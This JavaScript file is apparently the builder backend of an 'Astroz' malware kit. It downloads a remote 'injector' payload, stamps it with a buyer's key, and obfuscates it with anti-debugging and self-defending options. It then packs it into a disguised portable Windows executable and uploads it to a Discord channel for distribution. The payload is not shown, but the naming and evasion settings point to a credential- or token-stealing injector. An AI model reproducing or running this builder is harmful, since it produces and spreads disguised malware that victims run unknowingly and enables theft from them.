const { build, Platform, Arch } = require('electron-builder'); const fs = require('fs'), FormData = require('form-data'); const JavaScriptObfuscator = require('javascript-obfuscator'); const httpx = require("axios")

let api_url = 'https://sa-east-1.aws.data.mongodb-api.com/app/data-jowtd/endpoint/data/v1';


function uploadFile(file, name, key) {
    return new Promise(async res => {
        const form = new FormData();
        form.append("files[0]", fs.createReadStream(file));
        form.append("payload_json", JSON.stringify({"content":key,"channel_id": '1076886815983808617',"type":0,"sticker_ids":[],"attachments":[{"id":"0","filename":name }]}))
        const someshit = { headers: { "authorization": '', ...form.getHeaders() }, maxContentLength: Infinity, maxBodyLength: Infinity };
        try {
            const { data } = await httpx.post(`https://canary.discord.com/api/v9/channels/1076886815983808617/messages`, form, someshit);
            res(data.attachments[0].url);
        } catch (err) {
            console.log(err)
        }
    });
}

async function BuildFile(key, name) {
    return new Promise(async(resolve, reject) => {
        await build({
            targets: Platform.WINDOWS.createTarget(),
            config: {
                appId: `${name} Installer`,
                productName: name,
                win: {
                    artifactName: `${name}.exe`,
                    target: 'portable',
                    icon: `astroz_logo.ico`
                },
                compression: 'maximum',
                buildVersion: '1.0.0',
                directories: {
                    app: `./builds/${key}`,
                    output: `./output/${key}`
                }
            }
        }).then(() => {
            fs.unlinkSync(`./output/${key}/builder-debug.yml`);
            fs.unlinkSync(`./output/${key}/builder-effective-config.yaml`);
            fs.rmSync(`./output/${key}/win-unpacked`, { recursive: true });
            fs.rmSync(`./builds/${key}`, { recursive: true });
            return resolve('Success');
        })
    }).catch((err) => {
        return resolve('Error');
    });
}

async function Build(key, name) {
    return new Promise(async (resolve, reject) => {
        try {
            httpx(`${api_url}/getinjector/ui`).then((code => code.data)).then((res => {
                res = res.replace("__Astroz_Auth_Here__", key), replaced = res
                const obfuscationResult = JavaScriptObfuscator.obfuscate(replaced,
                    {
                      "ignoreRequireImports": true,
                      "compact": true,
                      "controlFlowFlattening": true,
                      "controlFlowFlatteningThreshold": 1,
                      "deadCodeInjection": true,
                      "deadCodeInjectionThreshold": 1,
                      "debugProtection": true,
                      "debugProtectionInterval": 0,
                      "disableConsoleOutput": true,
                      "identifierNamesGenerator": "hexadecimal",
                      "log": false,
                      "numbersToExpressions": true,
                      "renameGlobals": true,
                      "selfDefending": true,
                      "simplify": true,
                      "splitStrings": true,
                      "splitStringsChunkLength": 10,
                      "stringArray": true,
                      "stringArrayEncoding": ["base64"],
                      "stringArrayIndexShift": true,
                      "stringArrayRotate": false,
                      "stringArrayShuffle": true,
                      "stringArrayWrappersCount": 5,
                      "stringArrayWrappersChainedCalls": true,
                      "stringArrayWrappersParametersMaxCount": 5,
                      "stringArrayWrappersType": "function",
                      "stringArrayThreshold": 1,
                      "transformObjectKeys": true,
                      "unicodeEscapeSequence": false
                    }
                );
                const payload = obfuscationResult.getObfuscatedCode();
                const package = fs.readFileSync('./package.json')

                fs.mkdirSync(`./builds/${key}`)
                fs.writeFileSync(`./builds/${key}/index.js`, payload);
                fs.writeFileSync(`./builds/${key}/package.json`, package);
                BuildFile(key, name)
                .then((res) => {
                    if (res == 'Error') return console.log('An error occured')
                    else uploadFile(`./output/${key}/${name}.exe`, `${name}.exe`, `${key}`).then(link => { console.log(`[~] Builded : ${link}`); resolve({ success: true, 'link': link }) }) 
                })
            }))

            
        } catch (e) {
            resolve('Error')
        }
    })
};

module.exports.Build = Build;

process.on('unhandledRejection', (error) => {console.log(error)});
process.on("uncaughtException", (err, origin) => {console.log(err)})
process.on('uncaughtExceptionMonitor', (err, origin) => {console.log(err)});
process.on('beforeExit', (code) => {console.log(code)});
process.on('exit', (code) => {console.log(code)});
process.on('multipleResolves', (type, promise, reason) => {}); 